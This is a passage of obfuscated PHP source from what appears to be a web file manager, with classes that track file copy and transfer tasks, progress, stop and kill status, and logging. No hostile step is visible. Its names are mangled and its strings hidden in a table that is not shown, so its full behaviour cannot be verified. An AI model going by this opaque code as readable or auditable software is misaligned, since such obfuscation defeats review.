Model($Ê«°ÏÑë[625])->getInfoSimpleOuter($§şß÷ƒ); } } unset($ãœ†Ù„±); } public function parentLevelArray($Ô¤€Æ™á) { $Ä¼‰ÛÛ¸ =& $_SERVER[‘ÆÜ‘œ]; $Ô¤€Æ™á = explode($Ä¼‰ÛÛ¸[50], trim($Ô¤€Æ™á, $Ä¼‰ÛÛ¸[50])); return array_to_int(array_filter($Ô¤€Æ™á)); } public function listAll($€×à«›©) { $½ÀÖ±àí =& $_SERVER[‘ÆÜ‘œ]; $­ËÍñó„ = $this->sourceInfo($€×à«›©); $¡®«”Õ³ = array($½ÀÖ±àí[642] => array($½ÀÖ±àí[643], $­ËÍñó„[$½ÀÖ±àí[612]] . $€×à«›© . $½ÀÖ±àí[644]), $½ÀÖ±àí[645] => 0); $İíÈâè× = $½ÀÖ±àí[646]; $»×‹É± = "\114\105\x46\124\x20\x4a\x4f\x49\x4e\x20{$this->tablePrefix}\151\x6f\x5f\x66\x69\154\145\40\x66\151\x6c\x65\x20\x6f\156\x20\163\157\x75\x72\x63\145\x2e\146\x69\154\x65\x49\104\40\x3d\40\146\151\x6c\145\x2e\146\151\x6c\145\111\x44"; $Â¬ó»ôâ = $this->alias($½ÀÖ±àí[541])->field($İíÈâè×)->where($¡®«”Õ³)->join($»×‹É±)->select(); $this->_listAppendAuth($Â¬ó»ôâ); $this->_listAppendUser($Â¬ó»ôâ); $this->_listAppendPath($Â¬ó»ôâ); $Â¬ó»ôâ = array_to_keyvalue($Â¬ó»ôâ, $½ÀÖ±àí[192]); $‹ÛÀß˜ó = "\57{$­ËÍñó„[$½ÀÖ±àí[32]]}\57"; $‹ÛÀß˜ó = $‹ÛÀß˜ó == $½ÀÖ±àí[255] ? $½ÀÖ±àí[8] : $‹ÛÀß˜ó; $ñÈâ—ÜÕ = array(); foreach ($Â¬ó»ôâ as $±¦›—ã¹ => $¢û±´Œ) { $¢Ç¬¨æ¯ = $this->parentLevelArray($¢û±´Œ[$½ÀÖ±àí[612]]); array_shift($¢Ç¬¨æ¯); $è×·ËÒı = $‹ÛÀß˜ó; for ($µ§ôÖ„ = 0; $µ§ôÖ„ < count($¢Ç¬¨æ¯); $µ§ôÖ„++) { $è×·ËÒı .= $Â¬ó»ôâ[$¢Ç¬¨æ¯[$µ§ôÖ„]][$½ÀÖ±àí[32]] . $½ÀÖ±àí[8]; } $è×·ËÒı .= $¢û±´Œ[$½ÀÖ±àí[32]]; if ($¢û±´Œ[$½ÀÖ±àí[508]]) { $è×·ËÒı .= $½ÀÖ±àí[8]; } $×¡›û½¤ = array($½ÀÖ±àí[518] => str_replace($½ÀÖ±àí[255], $½ÀÖ±àí[8], str_replace($½ÀÖ±àí[255], $½ÀÖ±àí[8], str_replace($½ÀÖ±àí[255], $½ÀÖ±àí[8], $è×·ËÒı))), $½ÀÖ±àí[647] => intval($¢û±´Œ[$½ÀÖ±àí[508]]), $½ÀÖ±àí[648] => intval($¢û±´Œ[$½ÀÖ±àí[79]]), $½ÀÖ±àí[88] => intval($¢û±´Œ[$½ÀÖ±àí[88]]), $½ÀÖ±àí[90] => $this->pathInfoFilter($¢û±´Œ)); if (!$×¡›û½¤[$½ÀÖ±àí[508]]) { $×¡›û½¤[$½ÀÖ±àí[565]] = $¢û±´Œ[$½ÀÖ±àí[565]]; } $ñÈâ—ÜÕ[] = $×¡›û½¤; } $ñÈâ—ÜÕ = array_sort_by($ñÈâ—ÜÕ, $½ÀÖ±àí[87]); return $ñÈâ—ÜÕ; } } goto Cä±ÕË‰à†; E‘‘×ëòÎÄ: class Task { const STATYS_STOP = "\163\164\x6f\x70"; const STATYS_RUNNING = "\162\x75\x6e\156\151\x6e\147"; const STATYS_KILL = "\x6b\151\x6c\154"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($ºñ†…áş, $«¬Î³¶ = '', $Çøšûê‘ = 0, $ëÕ¤ĞÖç = '') { $¦ßñÌâ =& $_SERVER[‘ÆÜ‘œ]; if (self::get($ºñ†…áş)) { return; } $this->task = array($¦ßñÌâ[495] => $ºñ†…áş, $¦ßñÌâ[1544] => USER_ID, $¦ßñÌâ[1818] => $ëÕ¤ĞÖç, $¦ßñÌâ[548] => $¦ßñÌâ[12], $¦ßñÌâ[33] => $«¬Î³¶, $¦ßñÌâ[1182] => $¦ßñÌâ[12], $¦ßñÌâ[1180] => $Çøšûê‘, $¦ßñÌâ[1930] => 0, $¦ßñÌâ[1931] => 0, $¦ßñÌâ[1932] => 0, $¦ßñÌâ[1933] => timeFloat(), $¦ßñÌâ[1934] => 0, $¦ßñÌâ[1935] => 0, $¦ßñÌâ[1936] => 0, $¦ßñÌâ[1937] => 0, $¦ßñÌâ[857] => $¦ßñÌâ[1880]); $GLOBALS[$¦ßñÌâ[1938]] = 1; Hook::bind($¦ßñÌâ[1884], array($this, $¦ßñÌâ[1939])); Hook::bind($¦ßñÌâ[1940], array($this, $¦ßñÌâ[1941])); $this->startAfter(); Hook::trigger($¦ßñÌâ[1942], $this->task); $this->task[$¦ßñÌâ[1935]] = timeFloat(); } public function end($Í¢ÃüİĞ = '') { $´şßÉ•Ä =& $_SERVER[‘ÆÜ‘œ]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$´şßÉ•Ä[1935]]) { self::valueSet($this->task[$´şßÉ•Ä[495]], !1); } $this->isEnd = !0; if ($Í¢ÃüİĞ) { $this->task[$´şßÉ•Ä[548]] = $Í¢ÃüİĞ; } self::log($´şßÉ•Ä[1943] . $this->task[$´şßÉ•Ä[495]] . $´şßÉ•Ä[1944] . sprintf($´şßÉ•Ä[969], timeFloat() - $this->task[$´şßÉ•Ä[1933]]) . $´şßÉ•Ä[1945]); Hook::unbind($´şßÉ•Ä[1884], array($this, $´şßÉ•Ä[1939])); Hook::unbind($´şßÉ•Ä[1940], array($this, $´şßÉ•Ä[1941])); $this->endAfter(); $¼şôÁÓª = $this->task; $this->task = !1; Hook::trigger($´şßÉ•Ä[1946], $¼şôÁÓª); } public function update($ßëĞ°ó’ = 0, $¹÷Ÿ¦ƒ = false) { $İ½óÚá® =& $_SERVER[‘ÆÜ‘œ]; $·Š·ôş  =& $this->task; if (!$·Š·ôş ) { return; } $·Š·ôş [$İ½óÚá®[1930]] += $ßëĞ°ó’; $·Š·ôş [$İ½óÚá®[1934]] = timeFloat(); if ($·Š·ôş [$İ½óÚá®[1180]]) { if ($·Š·ôş [$İ½óÚá®[1180]] < $·Š·ôş [$İ½óÚá®[1930]]) { $·Š·ôş [$İ½óÚá®[1180]] = $·Š·ôş [$İ½óÚá®[1930]]; } $’«è¨é = timeFloat() - $·Š·ôş [$İ½óÚá®[1933]] - $·Š·ôş [$İ½óÚá®[1936]]; if ($’«è¨é <= 0) { $’«è¨é = 0.001; } $·Š·ôş [$İ½óÚá®[1931]] = $·Š·ôş [$İ½óÚá®[1930]] / $·Š·ôş [$İ½óÚá®[1180]]; $·Š·ôş [$İ½óÚá®[1932]] = $·Š·ôş [$İ½óÚá®[1930]] / $’«è¨é; if ($·Š·ôş [$İ½óÚá®[1931]] > 0) { $·Š·ôş [$İ½óÚá®[1937]] = $’«è¨é * (1 - $·Š·ôş [$İ½óÚá®[1931]]) / $·Š·ôş [$İ½óÚá®[1931]]; } $·Š·ôş [$İ½óÚá®[1937]] = $·Š·ôş [$İ½óÚá®[1937]] <= 0 ? 0 : $·Š·ôş [$İ½óÚá®[1937]]; } $this->updateAfter(); $ë±ˆÎî¶ = 0.2; if (timeFloat() - $·Š·ôş [$İ½óÚá®[1935]] < $ë±ˆÎî¶ && !$¹÷Ÿ¦ƒ) { return; } $ßåÆØşœ = self::get($·Š·ôş [$İ½óÚá®[495]]); $ÃÅƒ˜¥ = $ßåÆØşœ[$İ½óÚá®[857]]; if ($ÃÅƒ˜¥ == self::STATYS_KILL) { $ûª½Â•ğ = array($İ½óÚá®[1947] => LNG($İ½óÚá®[1948]), $İ½óÚá®[1351] => !1); Cache::set($İ½óÚá®[1949] . $this->task[$İ½óÚá®[495]], $ûª½Â•ğ, 30); $this->onKill(); $this->end(); die; } else { if ($ÃÅƒ˜¥ == self::STATYS_STOP) { $¡é®ñŞÒ = 2; $ßåÆØşœ[$İ½óÚá®[1936]] += $¡é®ñŞÒ; self::valueSet($·Š·ôş [$İ½óÚá®[495]], $ßåÆØşœ); sleep($¡é®ñŞÒ); $this->update(); return; } } $·Š·ôş [$İ½óÚá®[857]] = $ÃÅƒ˜¥ ? $ÃÅƒ˜¥ : $·Š·ôş [$İ½óÚá®[857]]; $·Š·ôş [$İ½óÚá®[1936]] = $ßåÆØşœ[$İ½óÚá®[1936]] ? $ßåÆØşœ[$İ½óÚá®[1936]] : 0; $·Š·ôş [$İ½óÚá®[1935]] = timeFloat(); Hook::trigger($İ½óÚá®[1950], $·Š·ôş ); self::valueSet($·Š·ôş [$İ½óÚá®[495]], $·Š·ôş ); } public function onKillSet($‰¿Ø«”, $·šğÍÁç = array()) { $this->onKillCall = array($‰¿Ø«”, $·šğÍÁç); } public function onKill() { $³ç†µÖï =& $_SERVER[‘ÆÜ‘œ]; self::log($³ç†µÖï[1943] . $this->task[$³ç†µÖï[495]] . $³ç†µÖï[1951]); Hook::trigger($³ç†µÖï[1952], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($ï½†À—ˆ) { $ûÂ’İã =& $_SERVER[‘ÆÜ‘œ]; Cache::set($ûÂ’İã[1949] . $this->task[$ûÂ’İã[495]], $ï½†À—ˆ, 60); if (!is_array($ï½†À—ˆ) || !$ï½†À—ˆ[$ûÂ’İã[1351]]) { self::log($ûÂ’İã[1953] . json_encode($ï½†À—ˆ)); } return $ï½†À—ˆ; } public static function get($ÌÀïñŠ) { $¥òİê‹ =& $_SERVER[‘ÆÜ‘œ]; $÷»ËìÆİ = self::valueGet($ÌÀïñŠ); if (is_array($÷»ËìÆİ) && $÷»ËìÆİ[$¥òİê‹[1954]]) { $òÉûÎé­ = ActionApply($÷»ËìÆİ[$¥òİê‹[1954]], array($÷»ËìÆİ)); $÷»ËìÆİ = is_array($òÉûÎé­) ? $òÉûÎé­ : $÷»ËìÆİ; } return $÷»ËìÆİ; } public static function listData() { $­Ñé“¬ = self::valueGet(); return array_sort_by($­Ñé“¬, $_SERVER[‘ÆÜ‘œ][1933], !0); } public static function kill($â­ŠÆ¨ª) { return self::changeStatus($â­ŠÆ¨ª, self::STATYS_KILL); } public static function stop($ÙÇ½ø’¨) { return self::changeStatus($ÙÇ½ø’¨, self::STATYS_STOP); } public static function restart($·çğìÂê) { return self::changeStatus($·çğìÂê, self::STATYS_RUNNING); } public static function killAll() { $¯«ä‚€’ =& $_SERVER[‘ÆÜ‘œ]; $ñ¦ŒÎô™ = self::listData(); foreach ($ñ¦ŒÎô™ as $Ñ®×Í«¸) { self::kill($Ñ®×Í«¸[$¯«ä‚€’[495]]); } sleep(2); foreach ($ñ¦ŒÎô™ as $Ñ®×Í«¸) { self::valueSet($Ñ®×Í«¸[$¯«ä‚€’[495]], !1); } } private static function changeStatus($öéŸŠÃà, $‘šõ‹ò×) { $ßçûÂ§È =& $_SERVER[‘ÆÜ‘œ]; $à¨óº–ª = self::valueGet($öéŸŠÃà); if (!$à¨óº–ª) { return !1; } $à¨óº–ª[$ßçûÂ§È[857]] = $‘šõ‹ò×; self::valueSet($öéŸŠÃà, $à¨óº–ª); self::log($ßçûÂ§È[1955] . $à¨óº–ª[$ßçûÂ§È[495]] . $ßçûÂ§È[1956] . $‘šõ‹ò×); return !0; } public static function valueGet($åªÂÆ‰¼ = false) { $¼»®¸…È =& $_SERVER[‘ÆÜ‘œ]; if ($åªÂÆ‰¼) { $³ßÏÀ‹‹ = Model($¼»®¸…È[542])->where(array($¼»®¸…È[95] => $åªÂÆ‰¼, $¼»®¸…È[33] => $¼»®¸…È[1189]))->find(); return $³ßÏÀ‹‹ ? json_decode($³ßÏÀ‹‹[$¼»®¸…È[460]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($—èú³†£ = false) { $´ø§ıáØ =& $_SERVER[‘ÆÜ‘œ]; $µÈÑ´…ç = array($´ø§ıáØ[33] => $´ø§ıáØ[1189]); if ($—èú³†£) { $µÈÑ´…ç[$´ø§ıáØ[1544]] = $—èú³†£; } $õâ¸ÂÂÅ = Model($´ø§ıáØ[542])->where($µÈÑ´…ç)->select(); $õâ¸ÂÂÅ = $õâ¸ÂÂÅ ? $õâ¸ÂÂÅ : array(); foreach ($õâ¸ÂÂÅ as $Ã¯ë’×Ú => $ÈœıÂ±Ç) { $õâ¸ÂÂÅ[$Ã¯ë’×Ú] = json_decode($ÈœıÂ±Ç[$´ø§ıáØ[460]], !0); } return $õâ¸ÂÂÅ; } public static function valueSet($¿—öàË, $’‚¸Ÿø) { $öÕ¬¥éü =& $_SERVER[‘ÆÜ‘œ]; if (!$’‚¸Ÿø) { return Model($öÕ¬¥éü[542])->where(array($öÕ¬¥éü[95] => $¿—öàË, $öÕ¬¥éü[33] => $öÕ¬¥éü[1189]))->delete(); } $¨£Ë¼†¶ = json_encode($’‚¸Ÿø); if (!$¨£Ë¼†¶) { ob_start(); var_dump($’‚¸Ÿø); $Ù’‰¸Š– = ob_get_clean(); self::log($öÕ¬¥éü[1957] . json_encode_force($Ù’‰¸Š–)); } if (!$¿—öàË || !$’‚¸Ÿø[$öÕ¬¥éü[495]]) { return !1; } $Æ–şÎÂ = array($öÕ¬¥éü[33] => $öÕ¬¥éü[1189], $öÕ¬¥éü[1544] => USER_ID, $öÕ¬¥éü[95] => $¿—öàË, $öÕ¬¥éü[460] => $¨£Ë¼†¶); $„ğ¤Šä¸ = $öÕ¬¥éü[1958]; CacheLock::lock($„ğ¤Šä¸); Model($öÕ¬¥éü[542])->add($Æ–şÎÂ, array(), !0); CacheLock::unlock($„ğ¤Šä¸); } public static function log($½‡ß½Ù¾) { if (!GLOBAL_DEBUG) { return; } write_log($½‡ß½Ù¾, $_SERVER[‘ÆÜ‘œ][1959]); } } class TaskFileTransfer extends Task { protected function startAfter() { $û¢á¬ì =& $_SERVER[‘ÆÜ‘œ]; $‰ª¤‚Ì =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($û¢á¬ì[1960], array($this, $û¢á¬ì[1961])); Hook::bind($û¢á¬ì[1362], array($this, $û¢á¬ì[1962])); Hook::bind($û¢á¬ì[1963], array($this, $û¢á¬ì[1964])); Hook::bind($û¢á¬ì[698], array($this, $û¢á¬ì[1965])); Hook::bind($û¢á¬ì[699], array($this, $û¢á¬ì[1966])); Hook::bind($û¢á¬ì[705], array($this, $û¢á¬ì[1967])); Hook::bind($û¢á¬ì[706], array($this, $û¢á¬ì[1968])); Hook::bind($û¢á¬ì[701], array($this, $û¢á¬ì[1969])); Hook::bind($û¢á¬ì[703], array($this, $û¢á¬ì[1970])); Hook::bind($û¢á¬ì[667], array($this, $û¢á¬ì[1971])); Hook::bind($û¢á¬ì[664], array($this, $û¢á¬ì[1971])); Hook::bind($û¢á¬ì[669], array($this, $û¢á¬ì[1971])); Hook::bind($û¢á¬ì[671], array($this, $û¢á¬ì[1971])); Hook::bind($û¢á¬ì[673], array($this, $û¢á¬ì[1971])); Hook::bind($û¢á¬ì[1972], array($this, $û¢á¬ì[1973])); Hook::bind($û¢á¬ì[689], array($this, $û¢á¬ì[1974])); $this->sourceModelCopyFlag = !1; Hook::bind($û¢á¬ì[1975], array($this, $û¢á¬ì[1976])); Hook::bind($û¢á¬ì[1977], array($this, $û¢á¬ì[1978])); Hook::bind($û¢á¬ì[1979], array($this, $û¢á¬ì[1980])); $‰ª¤‚Ì[$û¢á¬ì[1981]] = LNG($û¢á¬ì[1982]); $‰ª¤‚Ì[$û¢á¬ì[1983]] = 0; $‰ª¤‚Ì[$û¢á¬ì[1984]] = 0; $‰ª¤‚Ì[$û¢á¬ì[1182]] = $û¢á¬ì[12]; $‰ª¤‚Ì[$û¢á¬ì[1985]] = $û¢á¬ì[12]; $‰ª¤‚Ì[$û¢á¬ì[1986]] = 0; $‰ª¤‚Ì[$û¢á¬ì[1987]] = 0; $‰ª¤‚Ì[$û¢á¬ì[1988]] = 0; if (!$‰ª¤‚Ì[$û¢á¬ì[1818]]) { $‰ª¤‚Ì[$û¢á¬ì[1818]] = LNG($û¢á¬ì[1989]); } } protected function endAfter() { $ã“óÛ‡ =& $_SERVER[‘ÆÜ‘œ]; Hook::unbind($ã“óÛ‡[1960], array($this, $ã“óÛ‡[1961])); Hook::unbind($ã“óÛ‡[1362], array($this, $ã“óÛ‡[1962])); Hook::unbind($ã“óÛ‡[1963], array($this, $ã“óÛ‡[1964])); Hook::unbind($ã“óÛ‡[698], array($this, $ã“óÛ‡[1965])); Hook::unbind($ã“óÛ‡[699], array($this, $ã“óÛ‡[1966])); Hook::unbind($ã“óÛ‡[705], array($this, $ã“óÛ‡[1967])); Hook::unbind($ã“óÛ‡[706], array($this, $ã“óÛ‡[1968])); Hook::unbind($ã“óÛ‡[701], array($this, $ã“óÛ‡[1969])); Hook::unbind($ã“óÛ‡[703], array($this, $ã“óÛ‡[1970])); Hook::unbind($ã“óÛ‡[667], array($this, $ã“óÛ‡[1971])); Hook::unbind($ã“óÛ‡[664], array($this, $ã“óÛ‡[1971])); Hook::unbind($ã“óÛ‡[669], array($this, $ã“óÛ‡[1971])); Hook::unbind($ã“óÛ‡[671], array($this, $ã“óÛ‡[1971])); Hook::unbind($ã“óÛ‡[673], array($this, $ã“óÛ‡[1971])); Hook::unbind($ã“óÛ‡[1972], array($this, $ã“óÛ‡[1973])); Hook::unbind($ã“óÛ‡[689], array($this, $ã“óÛ‡[1974])); Hook::unbind($ã“óÛ‡[1975], array($this, $ã“óÛ‡[1976])); Hook::unbind($ã“óÛ‡[1977], array($this, $ã“óÛ‡[1978])); Hook::unbind($ã“óÛ‡[1979], array($this, $ã“óÛ‡[1980])); } public function copyMoveStart($ÓÊëòÆ, $Šüø’åî, $´ÍÉ„¢¸, $¾Ğµ÷À«) { $´Ãå¿Å¡ =& $_SERVER[‘ÆÜ‘œ]; self::log($´Ãå¿Å¡[1990] . $Šüø’åî . $´Ãå¿Å¡[73] . $¾Ğµ÷À«); $¾‰Ò“Ş‡ = rtrim(TEMP_FILES, $´Ãå¿Å¡[8]); if (substr($Šüø’åî, 0, strlen($¾‰Ò“Ş‡)) == $¾‰Ò“Ş‡) { return; } if (substr($¾Ğµ÷À«, 0, strlen($¾‰Ò“Ş‡)) == $¾‰Ò“Ş‡) { return; } $Ö•Â”êí =& $this->task; $Ö•Â”êí[$´Ãå¿Å¡[1991]] = KodIO::transferType($ÓÊëòÆ, $´ÍÉ„¢¸); self::log($´Ãå¿Å¡[1992] . $Ö•Â”êí[$´Ãå¿Å¡[1991]] . $´Ãå¿Å¡[74] . $Šüø’åî . $´Ãå¿Å¡[73] . $¾Ğµ÷À«); $this->update(); } public function updateAfter() { $™«ãƒû =& $_SERVER[‘ÆÜ‘œ]; $³¸¶Ï« =& $this->task; if (!$³¸¶Ï«[$™«ãƒû[871]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($³¸¶Ï«[$™«ãƒû[1991]] == $™«ãƒû[1465]) { return; } self::updateTask($³¸¶Ï«); } private static function updateTask(&$ûšù•µ) { $ÒÑŞÌÒ« =& $_SERVER[‘ÆÜ‘œ]; if ($ûšù•µ[$ÒÑŞÌÒ«[1991]] == $ÒÑŞÌÒ«[1333] || $ûšù•µ[$ÒÑŞÌÒ«[1991]] == $ÒÑŞÌÒ«[108]) { if ($ûšù•µ[$ÒÑŞÌÒ«[1985]]) { $ûšù•µ[$ÒÑŞÌÒ«[1988]] = $ûšù•µ[$ÒÑŞÌÒ«[1987]] + $ûšù•µ[$ÒÑŞÌÒ«[1984]]; } } else { if ($ûšù•µ[$ÒÑŞÌÒ«[1991]] == $ÒÑŞÌÒ«[1466]) { if ($ûšù•µ[$ÒÑŞÌÒ«[1985]] == $ÒÑŞÌÒ«[1333]) { $ûšù•µ[$ÒÑŞÌÒ«[1988]] = $ûšù•µ[$ÒÑŞÌÒ«[1987]] + $ûšù•µ[$ÒÑŞÌÒ«[1984]] * 0.5; } else { if ($ûšù•µ[$ÒÑŞÌÒ«[1985]] == $ÒÑŞÌÒ«[108]) { $ûšù•µ[$ÒÑŞÌÒ«[1988]] = $ûšù•µ[$ÒÑŞÌÒ«[1987]] + $ûšù•µ[$ÒÑŞÌÒ«[1983]] * 0.5 + $ûšù•µ[$ÒÑŞÌÒ«[1984]] * 0.5; } } } } $ûšù•µ[$ÒÑŞÌÒ«[1931]] = $ûšù•µ[$ÒÑŞÌÒ«[1988]] / $ûšù•µ[$ÒÑŞÌÒ«[871]]; if ($ûšù•µ[$ÒÑŞÌÒ«[1931]] > 0) { $Î€âñ– = timeFloat() - $ûšù•µ[$ÒÑŞÌÒ«[1933]] - $ûšù•µ[$ÒÑŞÌÒ«[1936]]; $ûšù•µ[$ÒÑŞÌÒ«[1937]] = $Î€âñ– * (1 - $ûšù•µ[$ÒÑŞÌÒ«[1931]]) / $ûšù•µ[$ÒÑŞÌÒ«[1931]]; } $¨†ø®¤Ü = $ûšù•µ[$ÒÑŞÌÒ«[1984]] . $ÒÑŞÌÒ«[953] . $ûšù•µ[$ÒÑŞÌÒ«[1983]] . "\73\x20{$Š²ºäÍ¢}\x3b" . $ûšù•µ[$ÒÑŞÌÒ«[1988]]; self::log($ÒÑŞÌÒ«[1993] . $ûšù•µ[$ÒÑŞÌÒ«[1985]] . $ÒÑŞÌÒ«[74] . $ûšù•µ[$ÒÑŞÌÒ«[1931]] . $ÒÑŞÌÒ«[74] . $¨†ø®¤Ü); } public function addPath($é¦õƒÂ›) { $¶±˜ãæ =& $_SERVER[‘ÆÜ‘œ]; if (!$é¦õƒÂ›) { return; } $ê ¹­Û¬ =& $this->task; $æø÷­’ = IO::infoWithChildren($é¦õƒÂ›); $²Ş¡¿ú¹ = $ê ¹­Û¬[$¶±˜ãæ[1994]] ? $ê ¹­Û¬[$¶±˜ãæ[1994]][$¶±˜ãæ[1995]] : 0; $ê ¹­Û¬[$¶±˜ãæ[1994]] = array($¶±˜ãæ[1995] => $²Ş¡¿ú¹ + 1, $¶±˜ãæ[517] => $æø÷­’[$¶±˜ãæ[32]], $¶±˜ãæ[87] => $æø÷­’[$¶±˜ãæ[87]], $¶±˜ãæ[610] => $æø÷­’[$¶±˜ãæ[610]] ? $æø÷­’[$¶±˜ãæ[610]] : $æø÷­’[$¶±˜ãæ[87]]); if ($æø÷­’[$¶±˜ãæ[33]] == $¶±˜ãæ[231]) { $ê ¹­Û¬[$¶±˜ãæ[1180]] += 1; } else { $ê ¹­Û¬[$¶±˜ãæ[1180]] += $æø÷­’[$¶±˜ãæ[82]][$¶±˜ãæ[80]]; if ($æø÷­’[$¶±˜ãæ[192]]) { $ê ¹­Û¬[$¶±˜ãæ[1180]] += $æø÷­’[$¶±˜ãæ[82]][$¶±˜ãæ[81]] + 1; } } $ê ¹­Û¬[$¶±˜ãæ[871]] += $æø÷­’[$¶±˜ãæ[79]]; $this->update(); self::log(array($¶±˜ãæ[1996] . $é¦õƒÂ›, $æø÷­’)); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($ÓùÜ¯·) { } public function sourceAddHashEnd($‘¿óÀÀû) { } public function sourceAddFileStart($Æƒ©µ°ƒ) { $»ŞË‹®å =& $_SERVER[‘ÆÜ‘œ]; $¸ïË¯±ß =& $this->task; $¸ïË¯±ß[$»ŞË‹®å[1983]] = $Æƒ©µ°ƒ[$»ŞË‹®å[79]]; $¸ïË¯±ß[$»ŞË‹®å[1981]] = $Æƒ©µ°ƒ[$»ŞË‹®å[32]]; $¸ïË¯±ß[$»ŞË‹®å[1182]] = $Æƒ©µ°ƒ[$»ŞË‹®å[32]]; $¸ïË¯±ß[$»ŞË‹®å[1997]] = $Æƒ©µ°ƒ[$»ŞË‹®å[87]]; $this->update(); self::log($»ŞË‹®å[1998] . $Æƒ©µ°ƒ[$»ŞË‹®å[87]] . $»ŞË‹®å[1999] . $Æƒ©µ°ƒ[$»ŞË‹®å[79]]); } public function sourceAddFileEnd($¨×§Ë«¡) { $Ûœ‡ºªå =& $_SERVER[‘ÆÜ‘œ]; $æëËšåÚ =& $this->task; $æëËšåÚ[$Ûœ‡ºªå[1988]] += $¨×§Ë«¡[$Ûœ‡ºªå[79]]; $æëËšåÚ[$Ûœ‡ºªå[1997]] = $¨×§Ë«¡[$Ûœ‡ºªå[87]]; $this->update(1); self::log($Ûœ‡ºªå[2000] . $¨×§Ë«¡[$Ûœ‡ºªå[87]] . $Ûœ‡ºªå[1999] . $¨×§Ë«¡[$Ûœ‡ºªå[79]] . $Ûœ‡ºªå[2001]); } public function copyFileStart($Ü·ÃÂ×õ, $ÙŠ¿öÚã, $’ÇÙÄòÊ, $’ˆ÷¨ŠÚ, $İÄÍ®ÊÁ, $¹ßûŞï) { $¡¿¼ ïÈ =& $_SERVER[‘ÆÜ‘œ]; $öÇ”òŞë = $İÄÍ®ÊÁ; if ($öÇ”òŞë == $GLOBALS[$¡¿¼ ïÈ[2002]]) { $öÇ”òŞë = $GLOBALS[$¡¿¼ ïÈ[2003]]; } $GLOBALS[$¡¿¼ ïÈ[2003]] = $İÄÍ®ÊÁ; $GLOBALS[$¡¿¼ ïÈ[2002]] = $¹ßûŞï; $¦ı‡¡Ä¾ =& $this->task; $¦ı‡¡Ä¾[$¡¿¼ ïÈ[1981]] = $öÇ”òŞë; $¦ı‡¡Ä¾[$¡¿¼ ïÈ[1983]] = (int) $Ü·ÃÂ×õ->size($ÙŠ¿öÚã); $¦ı‡¡Ä¾[$¡¿¼ ïÈ[1984]] = 0; $¦ı‡¡Ä¾[$¡¿¼ ïÈ[1182]] = $¡¿¼ ïÈ[12]; $¦ı‡¡Ä¾[$¡¿¼ ïÈ[1985]] = $¡¿¼ ïÈ[12]; $¦ı‡¡Ä¾[$¡¿¼ ïÈ[1986]] = 0; $Ç×Ø¨ıà = $¦ı‡¡Ä¾[$¡¿¼ ïÈ[1983]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($¦ı‡¡Ä¾[$¡¿¼ ïÈ[495]] . $¡¿¼ ïÈ[2004]); if ($Ç×Ø¨ıà && file_exists(get_path_father($’ˆ÷¨ŠÚ))) { Cache::set($¦ı‡¡Ä¾[$¡¿¼ ïÈ[495]] . $¡¿¼ ïÈ[2004], $’ˆ÷¨ŠÚ); $¦ı‡¡Ä¾[$¡¿¼ ïÈ[1954]] = array($¡¿¼ ïÈ[2005], $¡¿¼ ïÈ[2006]); } $this->update(0, $Ç×Ø¨ıà); self::log("\143\x6f\160\x79\106\151\x6c\x65\123\164\x61\162\x74\72{$ÙŠ¿öÚã}\x3b"); } public static function updateCopyLocalFileSize($ÇÆî±¡İ) { $âäÒƒ Œ =& $_SERVER[‘ÆÜ‘œ]; $½õçìĞ“ = Cache::get($ÇÆî±¡İ[$âäÒƒ Œ[495]] . $âäÒƒ Œ[2004]); if (!$½õçìĞ“ || !file_exists($½õçìĞ“)) { return $ÇÆî±¡İ; } $ÇÆî±¡İ[$âäÒƒ Œ[1984]] = @filesize($½õçìĞ“); $ÇÆî±¡İ[$âäÒƒ Œ[1988]] += $ÇÆî±¡İ[$âäÒƒ Œ[1984]]; self::updateTask($ÇÆî±¡İ); return $ÇÆî±¡İ; } public function copyFileEnd($™”Ëî×´, $ÂÁ½ŸÖ, $Ñ£Ø¬˜, $ø»‰Ô¥¡, $¥ÅºÖº, $Ø÷¨‹) { $”î¹¬Œ =& $_SERVER[‘ÆÜ‘œ]; $×ˆ×ÀÃ° =& $this->task; $×ˆ×ÀÃ°[$”î¹¬Œ[1984]] = $×ˆ×ÀÃ°[$”î¹¬Œ[1983]]; $×ˆ×ÀÃ°[$”î¹¬Œ[1985]] = $”î¹¬Œ[12]; unset($×ˆ×ÀÃ°[$”î¹¬Œ[1954]]); if ($¥ÅºÖº == $×ˆ×ÀÃ°[$”î¹¬Œ[1981]]) { $×ˆ×ÀÃ°[$”î¹¬Œ[1987]] += $×ˆ×ÀÃ°[$”î¹¬Œ[1983]]; $×ˆ×ÀÃ°[$”î¹¬Œ[1988]] = $×ˆ×ÀÃ°[$”î¹¬Œ[1987]]; $êïÌÜÀó = 1; if (isset($×ˆ×ÀÃ°[$”î¹¬Œ[1997]]) && $×ˆ×ÀÃ°[$”î¹¬Œ[1997]] == $ÂÁ½ŸÖ) { $êïÌÜÀó = 0; } $this->update($êïÌÜÀó); } else { $this->update(); $×ˆ×ÀÃ°[$”î¹¬Œ[1984]] = 0; } Cache::remove($×ˆ×ÀÃ°[$”î¹¬Œ[495]] . $”î¹¬Œ[2004]); self::log($”î¹¬Œ[2007] . $ÂÁ½ŸÖ . $”î¹¬Œ[73] . $ø»‰Ô¥¡ . $”î¹¬Œ[286] . $¥ÅºÖº . $”î¹¬Œ[2008] . $×ˆ×ÀÃ°[$”î¹¬Œ[1981]]); } public function updateFileEnd($ü¬¦¨Á, $ƒ«ÕÀß¹) { $ÙŞââÊ’ =& $_SERVER[‘ÆÜ‘œ]; $Ø¿¥Üñì =& $this->task; $Ø¿¥Üñì[$ÙŞââÊ’[1981]] = $ü¬¦¨Á; $Ø¿¥Üñì[$ÙŞââÊ’[1983]] = $ƒ«ÕÀß¹; $Ø¿¥Üñì[$ÙŞââÊ’[1987]] += $ƒ«ÕÀß¹; $Ø¿¥Üñì[$ÙŞââÊ’[1988]] = 